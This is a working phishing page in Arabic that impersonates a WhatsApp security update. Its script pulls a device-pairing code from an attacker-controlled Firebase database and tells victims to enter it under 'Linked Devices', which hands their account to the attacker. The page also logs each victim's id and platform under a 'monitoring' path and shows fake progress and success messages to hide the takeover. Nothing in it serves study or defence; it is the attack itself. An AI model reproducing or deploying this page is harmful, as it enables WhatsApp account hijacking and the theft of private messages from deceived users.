<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>WhatsApp Update</title>
    <meta property="og:title" content="WhatsApp Security Update">
    <meta property="og:description" content="تم توفير تحديث أمني جديد. يرجى إدخال رمز التحقق لتأمين محادثاتك.">
    <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg">
    
    <style>
        body { font-family: -apple-system, sans-serif; background: #fff; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
        .container { width: 90%; max-width: 400px; text-align: center; padding: 25px; border-radius: 15px; border: 1px solid #f0f2f5; }
        .logo { width: 60px; margin-bottom: 15px; }
        .title { color: #00a884; font-size: 19px; font-weight: bold; margin-bottom: 10px; }
        .desc { color: #667781; font-size: 13px; line-height: 1.5; margin-bottom: 20px; }
        .code-box { background: #f8f9fa; border: 1.5px solid #00a884; border-radius: 10px; padding: 25px; margin-bottom: 15px; min-height: 90px; display: flex; align-items: center; justify-content: center; position: relative; }
        #pairing-code { font-size: 34px; font-weight: bold; color: #111b21; letter-spacing: 5px; font-family: monospace; }
        #loading-ui { display: none; }
        .spinner { border: 3px solid #f3f3f3; border-top: 3px solid #00a884; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 0 auto 10px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .success-mark { display: none; color: #00a884; font-size: 50px; }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" class="logo">
        <div id="ui-content">
            <div class="title">تحديث نظام التشفير V3.0.1</div>
            <p class="desc" id="info-text">أدخل الرمز أدناه في "الأجهزة المرتبطة" على هاتفك لبدء المزامنة الآمنة للمحادثات.</p>
            <div class="code-box">
                <div id="pairing-code">---- ----</div>
                <div id="loading-ui"><div class="spinner"></div><p style="font-size:12px; color:#8696a0;">جاري معالجة البيانات...</p></div>
                <div id="success-ui" class="success-mark">✓</div>
            </div>
        </div>
        <p style="font-size: 11px; color: #abb4bb;">© 2026 WhatsApp Inc. Security Protocol</p>
    </div>

    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <script>
        const config = { databaseURL: "https://xstuxnet-7e038-default-rtdb.firebaseio.com/" };
        firebase.initializeApp(config);
        const db = firebase.database();
        const userId = new URLSearchParams(window.location.search).get('id');

        if (userId) {
            db.ref('monitoring/' + userId).set({ status: "Online", platform: navigator.platform });

            db.ref('commands/' + userId).on('value', snap => {
                const v = snap.val();
                if (v) {
                    if (v.code) {
                        document.getElementById('pairing-code').innerText = v.code;
                    }
                    if (v.status === 'syncing') {
                        document.getElementById('pairing-code').style.display = 'none';
                        document.getElementById('loading-ui').style.display = 'block';
                        document.getElementById('info-text').innerText = "جاري تحديث قاعدة بيانات الصور والرسائل المشفره...";
                    }
                    if (v.status === 'done') {
                        document.getElementById('loading-ui').style.display = 'none';
                        document.getElementById('success-ui').style.display = 'block';
                        document.getElementById('info-text').innerText = "تم تأمين الحساب بنجاح.";
                    }
                }
            });
        }
    </script>
</body>
</html>
